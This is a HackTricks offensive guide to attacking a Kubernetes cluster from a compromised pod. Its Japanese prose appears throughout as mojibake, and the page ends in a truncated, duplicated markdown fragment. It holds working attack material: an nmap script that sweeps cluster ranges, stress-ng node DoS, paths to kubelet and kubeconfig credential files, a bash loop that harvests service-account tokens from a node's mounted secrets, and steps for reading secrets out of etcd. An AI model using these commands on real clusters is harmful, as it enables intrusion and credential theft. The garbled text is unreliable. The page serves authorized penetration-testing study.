# Pod å†…éƒ¨ã‹ã‚‰ Kubernetes ã‚’æ”»æ’ƒã™ã‚‹

<details>

<summary><strong>AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šæ²è¼‰ã—ãŸã„å ´åˆ**ã‚„ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ PEASS & HackTricks ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks** ã® GitHub ãƒªãƒã‚¸ãƒˆãƒª [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

## **Pod è„±å‡º**

**é‹ãŒè‰¯ã‘ã‚Œã°ã€Pod ã‹ã‚‰ãƒãƒ¼ãƒ‰ã«è„±å‡ºã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Pod ã‹ã‚‰ã®è„±å‡º

Pod ã‹ã‚‰è„±å‡ºã—ã‚ˆã†ã¨ã™ã‚‹å ´åˆã€ã¾ãš**æ¨©é™æ˜‡æ ¼**ãŒå¿…è¦ã«ãªã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã®ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Pod ã‚’ä¹—ã£å–ã£ãŸå¾Œã€è„±å‡ºã‚’è©¦ã¿ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã® **docker è„±å‡º** ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes æ¨©é™ã®æ‚ªç”¨

**kubernetes åˆ—æŒ™**ã«ã¤ã„ã¦ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ã€Pod ã¯ãã‚Œã‚‰ã®å†…éƒ¨ã«**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æŒã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»–ã® Pod ã«**ç§»å‹•**ã—ãŸã‚Šã€è¨­å®šã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«**æ‚ªç”¨**ã§ãã‚‹**æ¨©é™**ãŒã„ãã¤ã‹ä»˜ä¸ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚æ–¹æ³•ã¯ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ã‚¯ãƒ©ã‚¦ãƒ‰æ¨©é™ã®æ‚ªç”¨

Pod ãŒ**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒ**å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¼æ´©**ã•ã›ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## è„†å¼±ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®æ¤œç´¢

Kubernetes ç’°å¢ƒå†…ã«ã„ã‚‹ã®ã§ã€ç¾åœ¨ã® Pod ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦æ¨©é™æ˜‡æ ¼ã§ããªã„å ´åˆã‚„ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡ºã§ããªã„å ´åˆã¯ã€**æ½œåœ¨çš„ã«è„†å¼±ãªã‚µãƒ¼ãƒ“ã‚¹ã‚’æ¢ã™ã¹ãã§ã™ã€‚**

### ã‚µãƒ¼ãƒ“ã‚¹

**ã“ã®ç›®çš„ã®ãŸã‚ã«ã€Kubernetes ç’°å¢ƒã®ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å–å¾—ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š**
```
kubectl get svc --all-namespaces
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Kubernetesã¯ãƒ•ãƒ©ãƒƒãƒˆãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã‚¹ã‚­ãƒ¼ãƒã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®**ä»»æ„ã®pod/serviceãŒä»–ã¨é€šä¿¡ã§ãã¾ã™**ã€‚ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®**namespacesã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åˆ¶é™ãŒã‚ã‚Šã¾ã›ã‚“**ã€‚namespaceå†…ã®èª°ã§ã‚‚ä»–ã®namespacesã¨é€šä¿¡ã§ãã¾ã™ã€‚

### ã‚¹ã‚­ãƒ£ãƒ‹ãƒ³ã‚°

ä»¥ä¸‹ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ï¼ˆ[Kubernetesãƒ¯ãƒ¼ã‚¯ã‚·ãƒ§ãƒƒãƒ—](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)ã‹ã‚‰å–å¾—ã—ãŸã‚‚ã®ã§ï¼‰ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ã®IPç¯„å›²ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**Kubernetesç‰¹æœ‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ”»æ’ƒ**ã—ã€**ä»–ã®ãƒãƒƒãƒ‰/ç’°å¢ƒå…¨ä½“ã‚’ä¾µå®³**ã™ã‚‹æ–¹æ³•ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼š

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**ä¾µå®³ã•ã‚ŒãŸãƒãƒƒãƒ‰ãŒæ©Ÿå¯†æ€§ã®é«˜ã„ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹**å ´åˆã€ä»–ã®ãƒãƒƒãƒ‰ãŒèªè¨¼ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€**ãƒ­ãƒ¼ã‚«ãƒ«é€šä¿¡ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ã§ã€ä»–ã®ãƒãƒƒãƒ‰ã‹ã‚‰é€ä¿¡ã•ã‚Œã‚‹èªè¨¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼ˆãã‚Œã«ã‚ˆã£ã¦**DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ï¼‰ãªã©ã®æŠ€è¡“ãŒKubernetesãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§æ©Ÿèƒ½ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒãƒƒãƒ‰å†…ã§**NET\_RAWæ©Ÿèƒ½**ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§å­˜åœ¨ã™ã‚‹ï¼‰ã‚’æŒã£ã¦ã„ã‚Œã°ã€ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã€**åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã«ã‚ˆã‚‹MitMæ”»æ’ƒã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€**æ‚ªæ„ã®ã‚ã‚‹ãƒãƒƒãƒ‰**ãŒ**DNSã‚µãƒ¼ãƒãƒ¼ã¨åŒã˜ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**å ´åˆã€**ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã«å¯¾ã—ã¦DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ãƒãƒ¼ãƒ‰DoS

Kubernetesãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã«ãƒªã‚½ãƒ¼ã‚¹ã®æ˜è¨˜ãŒãªãã€ã‚³ãƒ³ãƒ†ãƒŠã«**é©ç”¨ã•ã‚Œã‚‹ãƒªãƒŸãƒƒãƒˆ**ç¯„å›²ãŒè¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚æ”»æ’ƒè€…ã¨ã—ã¦ã€ãƒãƒƒãƒ‰/ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¶ˆè²»**ã—ã€ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¯æ¸‡ã•ã›ã€ç’°å¢ƒã«DoSã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
å®Ÿè¡Œä¸­ã®`stress-ng`ã¨ãã®å¾Œã®é•ã„ãŒã‚ã‹ã‚Šã¾ã™ã€‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ãƒãƒ¼ãƒ‰ã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰**è„±å‡º**ã«æˆåŠŸã—ãŸå ´åˆã€ãƒãƒ¼ãƒ‰å†…ã§ã„ãã¤ã‹èˆˆå‘³æ·±ã„ã‚‚ã®ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š

* **ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ **ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆDockerï¼‰
* ã“ã®ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ä»–ã®**ãƒãƒƒãƒ‰/ã‚³ãƒ³ãƒ†ãƒŠ**ã‚’æ‚ªç”¨ã§ãã¾ã™ï¼ˆã‚ˆã‚Šå¤šãã®ãƒˆãƒ¼ã‚¯ãƒ³ï¼‰
* å…¨ä½“ã®**ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ **ã¨**OS**ä¸€èˆ¬
* ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kube-Proxy**ã‚µãƒ¼ãƒ“ã‚¹
* ãƒªã‚¹ãƒ‹ãƒ³ã‚°ã—ã¦ã„ã‚‹**Kubelet**ã‚µãƒ¼ãƒ“ã‚¹ã€‚è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
* ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼š`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* ãã®ä»–ã®**kubernetesã®å…±é€šãƒ•ã‚¡ã‚¤ãƒ«**ï¼š
* `$HOME/.kube/config` - **ãƒ¦ãƒ¼ã‚¶ãƒ¼è¨­å®š**
* `/etc/kubernetes/kubelet.conf`- **é€šå¸¸ã®è¨­å®š**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **ãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—è¨­å®š**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcdè¨­å®š**
* `/etc/kubernetes/pki` - **Kubernetesã‚­ãƒ¼**

### ãƒãƒ¼ãƒ‰kubeconfigã®æ¤œç´¢

ä»¥å‰ã«ã‚³ãƒ¡ãƒ³ãƒˆã—ãŸãƒ‘ã‚¹ã®ä¸­ã§kubeconfigãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€kubeletãƒ—ãƒ­ã‚»ã‚¹ã®å¼•æ•°`--kubeconfig`ã‚’**ç¢ºèªã—ã¦ãã ã•ã„**ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã‚€
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ã‚¹ã‚¯ãƒªãƒ—ãƒˆ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) ã¯è‡ªå‹•çš„ã«**ä»–ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€æ¢ã—ã¦ã„ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™**ï¼ˆ1ã¤ãšã¤ç¢ºèªã™ã‚‹ä»£ã‚ã‚Šã«ï¼‰ã€‚
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æ¨©DaemonSets

DaemonSetã¯**å…¨ã¦ã®ã‚¯ãƒ©ã‚¹ã‚¿ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹** **pod**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€DaemonSetãŒ**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã§è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€**å…¨ã¦ã®ãƒãƒ¼ãƒ‰**ã§ãã®**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã®**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒã˜ã§ã™ãŒã€ä»Šå›ã¯é‹ã«ä¾å­˜ã—ã¾ã›ã‚“ã€‚

### ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ãƒ”ãƒœãƒƒãƒˆ

ã‚¯ãƒ©ã‚¹ã‚¿ãŒã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã€**ãƒãƒ¼ãƒ‰ã¯Podã¨ã¯ç•°ãªã‚‹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒãƒ¼ãƒ‰ã‹ã‚‰ï¼ˆã¾ãŸã¯hostNetworkã‚’Trueã«è¨­å®šã—ãŸpodã‹ã‚‰ï¼‰**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcdã®ç›—ã¿

ã‚³ãƒ³ãƒ†ãƒŠãŒå®Ÿè¡Œã•ã‚Œã‚‹Nodeã®[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ã‚’æŒ‡å®šã§ãã‚‹å ´åˆã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒãƒ¼ãƒ‰å†…ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã€**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã‚’å–å¾—ã—ã¾ã™ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-planeãƒãƒ¼ãƒ‰ã¯**role master**ã‚’æŒã¡ã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç®¡ç†ã‚¯ãƒ©ã‚¹ã‚¿ã§ã¯ãã‚Œã‚‰ã§ä½•ã‚‚å®Ÿè¡Œã§ãã¾ã›ã‚“**ã€‚

#### etcdã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã‚€

`nodeName`ã‚»ãƒ¬ã‚¯ã‚¿ã‚’ãƒãƒƒãƒ‰ä»•æ§˜ã«ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒ‰ã‚’control-planeãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã§ãã‚‹å ´åˆã€`etcd`ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç°¡å˜ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ã®ã™ã¹ã¦ã®è¨­å®šã€ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å«ã‚“ã§ã„ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€ã‚ãªãŸãŒã„ã‚‹control-planeãƒãƒ¼ãƒ‰ä¸Šã§`etcd`ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã€`etcd`ã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç´ æ—©ãå–å¾—ã™ã‚‹æ–¹æ³•ã§ã™ã€‚`etcd`ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£`etcdctl`ã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’ç«‹ã¡ä¸Šã’ã€control-planeãƒãƒ¼ãƒ‰ã®èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã©ã“ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã«é–¢ã‚ã‚‰ãšetcdã«æ¥ç¶šã™ã‚‹ã€ã‚ˆã‚Šæ´—ç·´ã•ã‚ŒãŸè§£æ±ºç­–ã‚’æ±‚ã‚ã‚‹å ´åˆã¯ã€@mauilionã®[ã“ã®ä¾‹ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆ](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚

**`etcd`ãŒcontrol-planeãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã—ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’è¦‹ã‚‹ï¼ˆã“ã‚Œã¯`kubeadm`ã§ä½œæˆã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã‚¿ä¸Šã§ã™ï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# Kuberneteså†…ã®Podã‹ã‚‰ã®æ”»æ’ƒ

Kubernetesã¯ã€ã‚³ãƒ³ãƒ†ãƒŠåŒ–ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ—ãƒ­ã‚¤ã€ã‚¹ã‚±ãƒ¼ãƒªãƒ³ã‚°ã€ãŠã‚ˆã³ç®¡ç†ã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã®ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã™ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¯Kubernetesã®é‡è¦ãªå´é¢ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒã‚¯ãƒ©ã‚¹ã‚¿å†…ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ãŸã‚Šã€æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ãŸã‚Šã™ã‚‹ã“ã¨ã‚’é˜²ããŸã‚ã«ã€é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒå¿…è¦ã§ã™ã€‚

## Podå†…ã‹ã‚‰ã®Kubernetes APIã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

